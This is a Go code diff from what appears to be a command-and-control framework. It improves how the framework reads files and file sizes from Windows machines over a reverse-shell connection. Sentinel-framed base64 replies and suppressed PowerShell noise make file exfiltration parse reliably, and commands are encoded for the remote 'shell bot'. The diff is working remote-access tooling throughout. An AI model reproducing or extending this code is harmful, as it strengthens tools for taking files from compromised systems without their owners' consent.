@@ -77,6 +77,23 @@ const (
 	// Read chunks are not embedded in the command (only the response carries
 	// data), so downloads can use a large chunk regardless of the host shell.
 	winReadChunk = 32768
+
+	// Fixed sentinels framing Windows replies whose payload the control end
+	// parses strictly (whole-file content, chunk content, file size). The read
+	// payloads are base64 (alphabet A-Za-z0-9+/=) and the size payload is
+	// decimal, so a sentinel containing '_' can never occur inside the data: the
+	// frame cannot collide with the payload it wraps. This lets the parser
+	// ignore any surrounding stream noise (e.g. a PowerShell CLIXML progress
+	// block) that a merged stderr would otherwise inject into the reply.
+	winReadBegin    = "__C2READ_B__"
+	winReadEnd      = "__C2READ_E__"
+	winReadMissing  = "__C2READ_M__"
+	winSizeBegin    = "__C2SIZE_B__"
+	winSizeEnd      = "__C2SIZE_E__"
+	winSizeMissing  = "__C2SIZE_M__"
+	winChunkBegin   = "__C2CHUNK_B__"
+	winChunkEnd     = "__C2CHUNK_E__"
+	winChunkMissing = "__C2CHUNK_M__"
 )
 
 // transferChunkSize is the plain-byte chunk size used for segmented upload
@@ -123,12 +140,25 @@ func (t target) finish(script string) (string, error) {
 	// Wrapping turns such failures into ordinary output instead.
 	script = "try{" + script + "}catch{$_|Out-String}"
 	if t.psHost() {
+		// Silence progress records (e.g. "Preparing modules for first use.")
+		// that PowerShell would otherwise serialize onto the reverse-shell
+		// stream as CLIXML and corrupt the command's output.
+		script = "$ProgressPreference='SilentlyContinue';" + script
 		if len(script) > winPSCmdLimit {
 			return "", fmt.Errorf("command too long for a PowerShell shell bot (%d > %d)", len(script), winPSCmdLimit)
 		}
 		return script, nil
 	}
+	// A known cmd.exe host gets its own powershell.exe child; discard that
+	// child's stderr so its CLIXML progress/error records cannot contaminate the
+	// shared reverse-shell stream. Intentional errors are already turned into
+	// stdout by the try/catch wrapper above. Only a *confirmed* cmd host gets
+	// `2>NUL`: on an unknown interpreter the parent may itself be PowerShell,
+	// where `2>NUL` would create a file named NUL instead of redirecting.
 	cmd := "powershell -NoProfile -EncodedCommand " + encodePS(script)
+	if t.env == EnvCmd {
+		cmd += " 2>NUL"
+	}
 	if len(cmd) > winCmdLimit {
 		return "", fmt.Errorf("command too long for a cmd shell bot (%d > %d)", len(cmd), winCmdLimit)
 	}
@@ -166,10 +196,16 @@ func psReadHead(path string, maxBytes int) string {
 
 func psReadChunk(path string, offset, length int64) string {
 	n := strconv.FormatInt(length, 10)
-	return "$c2fs=$null;try{$c2fs=[IO.File]::OpenRead(" + psLiteral(path) + ");" +
+	body := "$c2fs=$null;try{$c2fs=[IO.File]::OpenRead(" + psLiteral(path) + ");" +
 		"$c2fs.Seek(" + strconv.FormatInt(offset, 10) + ",[IO.SeekOrigin]::Begin)|Out-Null;" +
 		"$c2b=New-Object byte[] " + n + ";$c2r=$c2fs.Read($c2b,0," + n + ");" +
 		"[Convert]::ToBase64String($c2b,0,$c2r)}catch{$_|Out-String}finally{if($c2fs){$c2fs.Close()}}"
+	p := psLiteral(path)
+	// Frame the base64 payload with sentinels (see winReadBegin) so merged
+	// stderr noise cannot corrupt the decode; missing prints the missing marker.
+	return "if(Test-Path -LiteralPath " + p + " -PathType Leaf){" +
+		psLiteral(winChunkBegin) + ";" + body + ";" + psLiteral(winChunkEnd) +
+		"}else{" + psLiteral(winChunkMissing) + "}"
 }
 
 func psFileSize(path string) string {
@@ -177,9 +213,13 @@ func psFileSize(path string) string {
 	// Guard with Test-Path: Get-Item on a missing path is a *non-terminating*
 	// error, and ($null).Length is 0, so an unguarded read reports size 0 and a
 	// download of a missing file would silently produce an empty local file.
+	// The size is framed by sentinels so merged stderr noise (e.g. CLIXML)
+	// cannot corrupt the numeric parse.
 	return "if(Test-Path -LiteralPath " + p + " -PathType Leaf){" +
-		"try{(Get-Item -LiteralPath " + p + ").Length}catch{$_|Out-String}" +
-		"}else{'Error: not a file: ' + " + p + "}"
+		psLiteral(winSizeBegin) + ";" +
+		"try{(Get-Item -LiteralPath " + p + ").Length}catch{" + psLiteral(winSizeMissing) + "};" +
+		psLiteral(winSizeEnd) +
+		"}else{" + psLiteral(winSizeMissing) + "}"
 }
 
 func psWriteBase64(path, b64 string) string {
@@ -303,7 +343,7 @@ func readFileCmd(t target, path, startLine, endLine string) (string, error) {
 				return "", fmt.Errorf("invalid start_line: %s", v)
 			}
 		}
-		return t.finish(psReadHead(path, readFileByteCap))
+		return readFileWrappedCmd(t, path, winReadBegin, winReadEnd, winReadMissing, readFileByteCap)
 	}
 	start := strings.TrimSpace(startLine)
 	if start == "" || start == "0" {
